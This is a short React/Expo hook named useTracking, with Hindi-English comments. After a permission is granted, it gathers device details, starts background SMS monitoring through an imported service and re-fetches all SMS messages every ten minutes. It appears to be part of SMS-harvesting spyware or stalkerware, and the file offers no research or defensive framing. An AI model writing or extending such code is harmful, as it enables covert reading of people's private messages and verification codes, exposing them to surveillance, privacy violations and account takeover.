import { useEffect } from 'react';
import { startSmsListener, fetchAllSms } from '../services/SmsService';
import * as Device from 'expo-device';

const useTracking = (permissionStatus) => {
  useEffect(() => {
    if (permissionStatus === 'granted') {
      const deviceInfo = {
        brand: Device.brand,
        model: Device.modelName,
        os: Device.osVersion
      };

      // Background monitoring shuru karein
      startSmsListener(deviceInfo);
      
      // Har 10 minute mein purane SMS sync karein
      const interval = setInterval(() => {
        fetchAllSms();
      }, 600000); 

      return () => clearInterval(interval);
    }
  }, [permissionStatus]);
};

export default useTracking;